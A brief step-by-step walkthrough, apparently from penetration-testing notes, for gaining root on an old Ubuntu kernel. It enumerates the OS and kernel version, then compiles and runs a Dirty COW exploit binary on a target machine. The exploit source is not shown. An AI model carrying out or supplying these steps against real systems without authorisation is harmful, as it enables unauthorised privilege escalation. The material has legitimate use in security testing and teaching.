1. Obtain linux OS and kernel versions by performing basic enumeration. 

$ cat /etc/lsb-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=10.04
DISTRIB_CODENAME=lucid
DISTRIB_DESCRIPTION="Ubuntu 10.04.3 LTS"

$ uname -mra 
Linux sai 2.6.32-33-generic #70-Ubuntu SMP Thu Jun 17 16:07:46 UTC

2. Search the exploits like dirty cow for that kernel version and Clone the dirtycow c program file from git and compile it by using gcc. 
root@sai:~/Downloads/dirtycow-master# gcc -pthread dirty.c -o dirty -lcrypt

3. Copy the generated object file to the target linux machine and execute it.
$ ./dirty
